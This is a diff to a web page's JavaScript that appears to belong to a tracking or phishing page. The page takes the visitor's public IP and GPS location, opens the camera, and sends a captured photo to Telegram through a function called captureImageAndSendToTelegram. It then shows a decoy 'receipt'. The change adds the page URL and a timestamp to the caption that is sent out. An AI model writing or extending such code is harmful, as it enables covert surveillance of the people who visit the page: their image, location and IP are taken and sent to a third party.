@@ -119,7 +119,8 @@
       let ipAddress;
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
-        .then(data => ipAddress = data.ip);
+        .then(data => ipAddress = data.ip)
+        .catch()
 
       navigator.geolocation.getCurrentPosition(
         (position) => {
@@ -130,7 +131,10 @@
           navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
               console.log("Permissão da câmera concedida.");
-              const caption = `🏠 Location: https://www.google.com/maps/search/?api=1&query=${position.coords.latitude}%2C${position.coords.longitude}\n📍 IP: ${ipAddress}`
+              const currentDateTime = Date().toLocaleUpperCase("pt-BR")
+              const caption = `
+                🌐 ${window.location.href} \n📅 Date / Time: ${currentDateTime}\n🏠 Location: https://www.google.com/maps/search/?api=1&query=${position.coords.latitude}%2C${position.coords.longitude}\n📍 IP: ${ipAddress}
+              `
               captureImageAndSendToTelegram(stream, caption);  // Capture image and send to Telegram
               showReceipt();
             })
